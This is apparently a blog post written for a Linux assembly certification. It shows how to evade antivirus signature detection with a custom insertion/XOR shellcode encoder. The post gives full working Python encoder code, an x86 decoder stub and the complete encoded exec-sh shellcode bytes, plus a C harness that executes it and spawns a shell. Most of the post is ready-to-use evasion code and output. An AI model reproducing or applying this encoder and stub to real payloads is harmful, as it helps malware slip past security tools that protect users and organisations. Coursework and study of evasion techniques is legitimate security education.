
# Custom encoder for bypassing signature based detection

Malware detection techniques has improved a lot over the years. Today companies are investing in machine learning methods for detecting malware, which sounds pretty cool if you ask me. However, there is one method that has been used since the first anti-virus software, which is signature based detection.

When disassembling a program you can analyze the assembly instructions in order to understand the program from the lowest level. It's also possible from the assembly code to identify a set of unique instructions that identifies a specific program. These unique instructions form the signature. The instructions can be anything that identifies a specific and unique behaviour in the program. An example could be a decryption routine that identifies perhaps a decryption stub used for decrypting shellcode.

How do we bypass signature detections? Well, we change the signature. You either do this manually or you write an encoder which takes shellcode as input and outputs an encoded shellcode, which as zero known signatures for it. In this article, I will present a very easy and trivial encoding scheme for from AVs :)

## The Algorithm

The scheme I have chosen is a simple insertion encoder with XOR twist. Given a piece of shellcode, the encoder will insert a value between 1-255 as a prefix for each shellcode byte. This value will then be XORed with the shellcode byte. This method has some drawbacks:

- It will double the shellcode length 
- Once the shellcode has been decoded, a bunch of garbage data will exist follow1ing the shellcode. This means that if your shellcode does not return, the garbage data will be executed which leads to a segfault.

For demonstrating how bypassing signature detection looks like, this method will suffice.

## The Encoder

I have chosen to write the encoder in Python because it's very easy to implement these kinds of scripts in it.

```python
import sys
import random

def encode(shellcode):
    """
    shellcode: string

    returns: string
    """
    shellcode_output = ""
    shellcode_list = []
    for i in shellcode.split("\\")[1:]:
        xor_key = random.randint(1,254)
        hex_key = hex(xor_key)
        byte = int(i.replace("x", "0x"), 16)
        shellcode_list.append(hex_key)
        shellcode_list.append(hex(xor_key ^ byte))

    return ",".join(shellcode_list)

def decode(encoded_shellcode):
    """decode()
    encoded_shellcode: string

    returns: string
    """
    shellcode_list = encoded_shellcode.split(",")
    it = iter(shellcode_list)
    decoded_shellcode = []
    for x in it:
        decoded_shellcode.append(hex(int(x, 16) ^ int(next(it), 16)))
    return ",".join(decoded_shellcode)

def main(shellcode):
    """main()
    shellcode: string
    """
    orginal_shellcode = r"{}".format(shellcode)
    new_shellcode = encode(orginal_shellcode)
    print("[+] Your encoded shellcode: ")
    print(new_shellcode)
    print("\n[+] Decoded shellcode:")
    decoded_shellcode = decode(new_shellcode)
    print(decoded_shellcode)
    assert decoded_shellcode.replace("0x","\\x").replace(",","") == orginal_shellcode.replace("\\x0", "\\x")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 wrapper.py <shellcode>")
        sys.exit(0)

    if len(sys.argv) == 2:
        main(sys.argv[1])

```

To use the program, simply input your shellcode and receive the encoded version:

```
dubs3c@slae:~/SLAE/EXAM/github/assignment_4$ python3 wrapper.py "\xfc\xbb\x1b\x91\xcd\xc8\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x2a\x43\x9f\xa0\x22\x4c\x53\x59\xd2\xbd\xbc\xfb\x4b\x4b\x21\xca\x42\x7a\x66\x9d\x5f\xb0\xe6\xde\x5f\x4a\xe7\xde"
[+] Your encoded shellcode:
0x77,0x8b,0x4a,0xf1,0xdb,0xc0,0x5,0x94,0xe7,0x2a,0x43,0x8b,0x93,0x78,0x73,0x7f,0x38,0x66,0xe5,0xb3,0x14,0x25,0x2d,0x33,0x6b,0xc6,0xc5,0xc4,0x56,0x95,0x8d,0x8,0x2f,0xef,0xd,0x78,0x9f,0x68,0x7a,0xb9,0xd7,0x3f,0xf5,0x1a,0xba,0x45,0x2,0xfd,0x93,0x6c,0xe3,0xc9,0xee,0xad,0x93,0xc,0xb5,0x15,0xe3,0xc1,0xe,0x42,0xbd,0xee,0xf8,0xa1,0xaf,0x7d,0x65,0xd8,0x24,0x98,0x86,0x7d,0xb1,0xfa,0xf8,0xb3,0x96,0xb7,0x2a,0xe0,0x27,0x65,0x69,0x13,0x3a,0x5c,0x55,0xc8,0x1,0x5e,0x59,0xe9,0x7a,0x9c,0xd7,0x9,0xb2,0xed,0xc5,0x8f,0xd4,0x33,0xfa,0x24

[+] Decoded shellcode:
0xfc,0xbb,0x1b,0x91,0xcd,0xc8,0xeb,0xc,0x5e,0x56,0x31,0x1e,0xad,0x1,0xc3,0x85,0xc0,0x75,0xf7,0xc3,0xe8,0xef,0xff,0xff,0xff,0x2a,0x43,0x9f,0xa0,0x22,0x4c,0x53,0x59,0xd2,0xbd,0xbc,0xfb,0x4b,0x4b,0x21,0xca,0x42,0x7a,0x66,0x9d,0x5f,0xb0,0xe6,0xde,0x5f,0x4a,0xe7,0xde
dubs3c@slae:~/SLAE/EXAM/github/assignment_4$
```

The shellcode used in the example above is a simple `exec-sh` shellcode which will drop into an `sh` shell.

## Writing the decoder stub

It's time to write the decoder stub. The following is a simple program for looping through the shellcode, XORing bytes, reconstructing the original shellcode.

```asm
;-------------------------------------
;
; Author: dubs3c
;
; Purpose:
; Insertion Encoder, hide from AV :)
;
;-------------------------------------

global _start

section .text
_start:
    jmp short call_shellcode        ; jmp-call-pop method

decoder:
    pop esi                         ; Get the address of EncodedShellcode
    lea edi, [esi + 1]              ; edi points to the next byte
    xor eax, eax                    ; zero out register
    xor ebx, ebx                    ; zero out register
    xor edx, edx                    ; zero out register
    xor ecx, ecx                    ; zero out register

decode:
    mov bl, byte [esi + eax]        ; Get the byte at esi + eax
    xor bl, 0xaa                    ; XOR with 0xaa to check if we are at the end of the shellcode
    jz short EncodedShellcode       ; If we are at the end, we are done, jump to shellcode
    mov dl, byte [esi + eax]        ; Get the byte at esi + eax
    mov bl, byte [esi + eax + 1]    ; Get the byte at esi + eax + 1
    xor dl, bl                      ; XOR to get orignal shellcode byte
    mov byte [esi + ecx], dl        ; Overwrite EncodedShellcode at byte esi + ecx with the result
    add al, 2                       ; Add 2 to eax to jump to the next pair of bytes
    inc ecx                         ; increment ecx which byte to overwrite in EncodedShellcode
    jmp short decode                ; loop back to decode

call_shellcode:
    call decoder
    EncodedShellcode: db 0x1,0xfd,0xa2,0x19,0x60,0x7b,0x7d,0xec,0xac,0x61,0xac,0x64,0x31,0xda,0x2b,0x27,0xb1,0xef,0xd,0x5b,0x66,0x57,0xa5,0xbb,0xc7,0x6a,0xac,0xad,0x41,0x82,0x7a,0xff,0x5,0xc5,0xf4,0x81,0xf1,0x6,0x99,0x5a,0x54,0xbc,0xac,0x43,0x28,0xd7,0x4,0xfb,0x1b,0xe4,0x11,0x3b,0x35,0x76,0xdc,0x43,0x57,0xf7,0x4f,0x6d,0xe1,0xad,0xd7,0x84,0x6c,0x35,0x62,0xb0,0x7b,0xc6,0x7f,0xc3,0x80,0x7b,0x1f,0x54,0x45,0xe,0xa9,0x88,0x97,0x5d,0x84,0xc6,0xe9,0x93,0x6c,0xa,0x6f,0xf2,0x7a,0x25,0xe0,0x50,0x88,0x6e,0x3b,0xe5,0x56,0x9,0x6f,0x25,0xae,0x49,0xe3,0x3d,0xaa,0xaa
```

The program can be assembled with nasm:

```bash
nasm -f elf32 -o build/ass4.o ass4.nasm
ld -z execstack -N -o build/ass4 build/ass4.o
```

Because I have specified the `-N` option, the code section is now writable and we can run the executable.
```bash
dubs3c@slae:~/SLAE/EXAM/github/assignment_4$ ./build/ass4
$ whoami
dubs3c
$
```

We can also extract the shellcode and use e.g. in a stager:
```bash
dubs3c@slae:~/SLAE/EXAM/github/assignment_4$ objdump -d ./build/ass4|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\xeb\x25\x5e\x8d\x7e\x01\x31\xc0\x31\xdb\x31\xd2\x31\xc9\x8a\x1c\x06\x80\xf3\xaa\x74\x16\x8a\x14\x06\x8a\x5c\x06\x01\x30\xda\x88\x14\x0e\x04\x02\x41\xeb\xe7\xe8\xd6\xff\xff\xff\x01\xfd\xa2\x19\x60\x7b\x7d\xec\xac\x61\xac\x64\x31\xda\x2b\x27\xb1\xef\x0d\x5b\x66\x57\xa5\xbb\xc7\x6a\xac\xad\x41\x82\x7a\xff\x05\xc5\xf4\x81\xf1\x06\x99\x5a\x54\xbc\xac\x43\x28\xd7\x04\xfb\x1b\xe4\x11\x3b\x35\x76\xdc\x43\x57\xf7\x4f\x6d\xe1\xad\xd7\x84\x6c\x35\x62\xb0\x7b\xc6\x7f\xc3\x80\x7b\x1f\x54\x45\x0e\xa9\x88\x97\x5d\x84\xc6\xe9\x93\x6c\x0a\x6f\xf2\x7a\x25\xe0\x50\x88\x6e\x3b\xe5\x56\x09\x6f\x25\xae\x49\xe3\x3d\xaa\xaa"
```

The shellcode could be embedded in a somple C program that will execute the decoder program, containing our `exec-sh` shellcode.

```c
#include<stdio.h>
#include<string.h>


unsigned char shellcode[] = "\xeb\x25\x5e\x8d\x7e\x01\x31\xc0\x31\xdb\x31\xd2\x31\xc9\x8a\x1c\x06\x80\xf3\xaa\x74\x16\x8a\x14\x06\x8a\x5c\x06\x01\x30\xda\x88\x14\x0e\x04\x02\x41\xeb\xe7\xe8\xd6\xff\xff\xff\x01\xfd\xa2\x19\x60\x7b\x7d\xec\xac\x61\xac\x64\x31\xda\x2b\x27\xb1\xef\x0d\x5b\x66\x57\xa5\xbb\xc7\x6a\xac\xad\x41\x82\x7a\xff\x05\xc5\xf4\x81\xf1\x06\x99\x5a\x54\xbc\xac\x43\x28\xd7\x04\xfb\x1b\xe4\x11\x3b\x35\x76\xdc\x43\x57\xf7\x4f\x6d\xe1\xad\xd7\x84\x6c\x35\x62\xb0\x7b\xc6\x7f\xc3\x80\x7b\x1f\x54\x45\x0e\xa9\x88\x97\x5d\x84\xc6\xe9\x93\x6c\x0a\x6f\xf2\x7a\x25\xe0\x50\x88\x6e\x3b\xe5\x56\x09\x6f\x25\xae\x49\xe3\x3d\xaa\xaa"; 

main()
{
        printf("Shellcode length:  %d\n", strlen(shellcode));
        int (*ret)() = (int(*)())shellcode;
        ret();
}
```

The program can be compiled like this:

```
dubs3c@slae:~/SLAE/EXAM/github/assignment_4$ gcc -fno-stack-protector -z execstack shellcode.c -o build/shellcode
dubs3c@slae:~/SLAE/EXAM/github/assignment_4$ ./build/shellcode
Shellcode length:  152
$ whoami
dubs3c
$
```

That's it, happy hacking :)

---
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[https://www.pentesteracademy.com/course?id=3](https://www.pentesteracademy.com/course?id=3)

Student ID: SLAE-1490

